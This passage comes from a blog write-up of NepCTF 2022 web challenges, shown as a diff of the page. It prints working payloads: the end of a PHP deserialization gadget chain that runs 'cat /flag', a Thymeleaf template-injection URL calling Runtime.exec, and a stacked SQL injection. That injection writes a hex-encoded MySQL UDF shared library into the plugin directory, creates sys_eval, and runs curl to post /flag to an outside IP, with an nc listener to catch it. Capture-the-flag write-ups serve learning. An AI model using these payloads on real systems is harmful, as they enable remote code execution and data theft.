+            $this-&gt;event = &quot;cat /flag&quot;;
+            $this-&gt;events = new \Faker\Generator();
+        &#125;
+    &#125;
+&#125;
+
+namespace Symfony\Component\Mime\Part &#123;
+    abstract class AbstractPart &#123;
+        private $headers = null;
+    &#125;
+
+    class SMimePart extends AbstractPart &#123;
+        protected $_headers;
+        public $h3rmesk1t;
+        function __construct() &#123;
+            $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;];
+            $this-&gt;h3rmesk1t = new \Illuminate\Broadcasting\PendingBroadcast();
+        &#125;
+    &#125;
+&#125;
+
+
+namespace &#123;
+    $pop = new \Symfony\Component\Mime\Part\SMimePart();
+    $ser = preg_replace(&quot;/([^\&#123;]*\&#123;)(.*)(s:49.*)(\&#125;)/&quot;,&quot;\\1\\3\\2\\4&quot;,serialize($pop));
+    echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));
+&#125;
+</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152340140.png?x-oss-process=hzy" alt="image-20220715234022070"></p>
+<p>NepCTF{e3edfaa0-e66e-4c7b-8c0b-e1cde5c7c40a}</p>
+<h2 id="challenger">Challenger</h2>
+<blockquote>
+<p>顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭</p>
+<p>（flag在根目录下: /flag）</p>
+</blockquote>
+<p>下附件，分析路由，Thymeleaf模板注入</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207160057751.png?x-oss-process=hzy" alt="image-20220716005743688"></p>
+<p>get传payload如下</p>
+<pre><code class="hljs plaintext">eval?lang=__$%7Bnew java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;cat /flag&quot;).getInputStream()).next()%7D__::.x</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152349502.png?x-oss-process=hzy" alt="image-20220715234918429"></p>
+<p>NepCTF{b2d6a9bf-4f90-4abc-b5ae-9c07c4439ca5}</p>
+<h2 id="博学多闻的花花">博学多闻的花花</h2>
+<blockquote>
+<p>坏女人要去参加CTF高考了，你能帮帮她嘛？(这个帮不得吧…)</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170936068.png?x-oss-process=hzy" alt="image-20220717093551450"></p>
+<p>在my.cnf中看到是可以写进去so到plugin的，考虑是udf提权</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170940483.png?x-oss-process=hzy" alt="image-20220717094031422"></p>
+<p>同时index.php界面用户注册之后存在堆叠注入<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207170940278.png?x-oss-process=hzy" alt="image-20220717094006191"></p>
+<p>payload</p>
+<pre><code class="hljs plaintext">q1=1&amp;q2=2&amp;q3=3&amp;q4=4&amp;q5=5&#x27;);0x7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400 into dumpfile &#x27;/usr/lib64/mysql/plugin/hzy.so&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;hzy.so&#x27;;SELECT sys_eval(&#x27;curl http://43.138.40.212:4000 -d @/flag&#x27;);#</code></pre>
+<pre><code class="hljs plaintext">vps外带数据
+nc -lvnp 4000</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171027968.png?x-oss-process=hzy" alt="image-20220717102715914"></p>
+<p>NepCTF{CBF3BB22-D632-441D-A96D-405E0550A10F}</p>
+<h2 id="qrcode-maker">QRCode Maker</h2>
+<h1 id="pwn">pwn</h1>
+<h2 id="全栈手">全栈手</h2>
+<blockquote>
+<p>阿毛给了H3一个C4炸弹，啪的一下很快啊，这个网站被炸了好几个洞 tips:本题目不提供附件 tips:附件通过源码泄露获取</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172247341.png?x-oss-process=hzy" alt="image-20220717224741049"></p>
+<p>有个非预期解，是只需要会web就可以的，预期解的pwn我不会</p>
+<p>首先存在一个目录穿越</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172248135.png?x-oss-process=hzy" alt="image-20220717224840055"></p>
+<p>bp拦截得到key</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172250238.png?x-oss-process=hzy" alt="image-20220717225056161"></p>
+<p>然后是ac4加密，直接解密就行</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172251053.png?x-oss-process=hzy" alt="image-20220717225134983"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="故里 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>故里
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2022/07/17/NepCTF/" title="NepCTF 2022">https://hzy2003628.top/2022/07/17/NepCTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/" rel="tag"><i class="fa fa-tag"></i> 赛后复盘</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/09/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/" rel="prev" title="第六届蓝帽杯初赛">
+      <i class="fa fa-chevron-left"></i> 第六届蓝帽杯初赛
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/07/19/ImaginaryCTF/" rel="next" title="ImaginaryCTF 2022">
+      ImaginaryCTF 2022 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8A%B1%E8%8A%B1%E7%94%BB%E7%94%BB%E7%94%BB%E8%8A%B1%E8%8A%B1"><span class="nav-number">2.1.</span> <span class="nav-text">花花画画画花花</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%E7%82%B9%E7%9B%B4%E6%92%AD"><span class="nav-number">2.3.</span> <span class="nav-text">9点直播</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%91%E8%A7%81%E7%9A%84bbbbase"><span class="nav-number">2.4.</span> <span class="nav-text">少见的bbbbase</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A6%85%E9%A5%BC%E9%99%B7%E9%98%B1"><span class="nav-number">2.5.</span> <span class="nav-text">馅饼？陷阱！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E5%8D%B7"><span class="nav-number">2.6.</span> <span class="nav-text">问卷</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">3.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB%E6%9D%A5%E7%AD%BE%E5%88%B0"><span class="nav-number">3.1.</span> <span class="nav-text">快来签到</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">4.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#just-kidding"><span class="nav-number">4.1.</span> <span class="nav-text">Just Kidding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#challenger"><span class="nav-number">4.2.</span> <span class="nav-text">Challenger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%9A%E5%AD%A6%E5%A4%9A%E9%97%BB%E7%9A%84%E8%8A%B1%E8%8A%B1"><span class="nav-number">4.3.</span> <span class="nav-text">博学多闻的花花</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qrcode-maker"><span class="nav-number">4.4.</span> <span class="nav-text">QRCode Maker</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">5.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 